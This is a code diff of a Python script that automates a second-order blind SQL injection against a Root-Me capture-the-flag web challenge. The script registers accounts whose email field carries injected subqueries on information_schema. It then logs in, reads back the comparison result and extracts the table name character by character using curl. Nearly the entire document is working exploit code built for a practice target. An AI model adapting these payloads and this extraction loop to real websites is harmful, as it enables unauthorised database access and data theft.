@@ -19,9 +19,10 @@ class User:
 	def __init__(self, defaultName=''):
 		if defaultName != '':
 			self.name = defaultName
+			self.currentChar = User.charList.index(self.name[-1])
 		else:
 			self.name = User.charList[0]
-		self.currentChar = 0
+			self.currentChar = 0
 
 	def __repr__(self):
 		return (self.name)
@@ -45,26 +46,21 @@ class User:
 # Get length of table_name
 print('Getting length of table_name')
 email = urlencode("' + LENGTH((SELECT table_name FROM information_schema.tables LIMIT 1)) + '")
-user = User()
-s = os.popen("curl http://challenge01.root-me.org/web-serveur/ch33/?action=register -d 'username={0}&password=a&email={1}'".format(user,email)).read()
+user = User('gggw')
+s = os.popen("curl -s http://challenge01.root-me.org/web-serveur/ch33/?action=register -d 'username={0}&password=a&email={1}'".format(user,email)).read()
 print(user,s)
 while 'user exist' in s.lower():
 	user.next()
-	print(user),
+	print("user {0} exists".format(user))
 	sys.stdout.flush()
-	s = os.popen("curl http://challenge01.root-me.org/web-serveur/ch33/?action=register -d 'username={0}&password=a&email={1}'".format(user,email)).read()
-	print(s)
-	raw_input()
+	s = os.popen("curl -s http://challenge01.root-me.org/web-serveur/ch33/?action=register -d 'username={0}&password=a&email={1}'".format(user,email)).read()
 
-s = os.popen("curl http://challenge01.root-me.org/web-serveur/ch33/?action=login -d 'username={0}&password=a'".format(user)).read()
-print("'"+s+"'")
+s = os.popen("curl -s http://challenge01.root-me.org/web-serveur/ch33/?action=login -d 'username={0}&password=a'".format(user)).read()
 table_name_len = re.match('(.*\n)*.*Email : (\d+).*', s).group(2)
 print('Table name length: {0}'.format(table_name_len))
-exit()
 
 # Get table_name
 print('Getting table_name')
-user += 1
 tryList = list('abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_')
 i = 0
 tableName = ''
@@ -72,16 +68,17 @@ while i < table_name_len:
 	print(i, tableName)
 	c = 32
 	while c < 127:
-		if chr(c) == "'":
+		if chr(c) in "'\\":
 			c += 1
 			continue
 
-		print(c,chr(c)),
-		email = urlencode("{0}' < (SELECT table_name FROM information_schema.tables LIMIT 1) + '".format(tableName+chr(c)))
+		print("' or '{0}' < (SELECT table_name FROM information_schema.tables LIMIT 1) or '".format(tableName+chr(c)))
+		email = urlencode("' or '{0}' < (SELECT table_name FROM information_schema.tables LIMIT 1) or '".format(tableName+chr(c)))
+		user.next()
 		s = os.popen("curl -s http://challenge01.root-me.org/web-serveur/ch33/?action=register -d 'username={0}&password=a&email={1}'".format(user,email)).read()
 		while 'user exist' in s.lower():
-			user += 1
-			print(user)
+			print("user {0} exists".format(user))
+			user.next()
 			sys.stdout.flush()
 			s = os.popen("curl -s http://challenge01.root-me.org/web-serveur/ch33/?action=register -d 'username={0}&password=a&email={1}'".format(user,email)).read()
 		s = os.popen("curl -s http://challenge01.root-me.org/web-serveur/ch33/?action=login -d 'username={0}&password=a'".format(user)).read()
@@ -89,16 +86,16 @@ while i < table_name_len:
 			if s:
 				result = re.match('(.*\n)*.*Email : (\d+).*', s).group(2)
 			else:
+				print("Empty result !")
 				break
 		except AttributeError:
 			print('erreur:' + s)
 			exit()
-		if result == '0':
-			tableName += chr(c-1)
-			#print(list(tableName))
-			break
-		else:
+		if result == '1':
 			c += 1
+		elif result == '0':
+			tableName += chr(c-1)
+			break
 	i += 1
 
 print(user)
